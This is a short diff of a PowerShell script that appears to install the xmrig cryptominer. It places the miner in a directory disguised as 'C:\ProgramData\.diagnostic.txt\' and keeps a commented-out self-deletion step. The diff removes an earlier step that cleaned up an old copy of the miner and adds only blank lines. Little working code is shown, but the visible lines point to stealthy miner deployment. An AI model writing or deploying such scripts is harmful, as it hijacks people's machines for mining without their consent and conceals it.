@@ -6,16 +6,6 @@ Write-Host "Current user: $currentUserName"
 $targetDir = "C:\ProgramData\.diagnostic.txt\"
 $oldMinerPath = "C:\Users\$currentUserName\xmrig.exe"
 
-# Step 1: Clean up old files
-Write-Host "Step 1: Cleaning up old files..."
-if (Test-Path $oldMinerPath) {
-    try {
-        Remove-Item -Force $oldMinerPath -ErrorAction SilentlyContinue
-        Write-Host "  Removed old miner from user directory"
-    } catch {
-        Write-Host "  Warning: Could not remove old miner" -ForegroundColor Yellow
-    }
-}
 
 # Step 2: Create target directory
 Write-Host "`nStep 2: Creating target directory..."
@@ -277,6 +267,7 @@ Write-Host "Check Task Manager or 'services.msc' to verify." -ForegroundColor Gr
 # } catch {
 #     Write-Host "Could not remove script file." -ForegroundColor Yellow
 # }
+
 
 
 
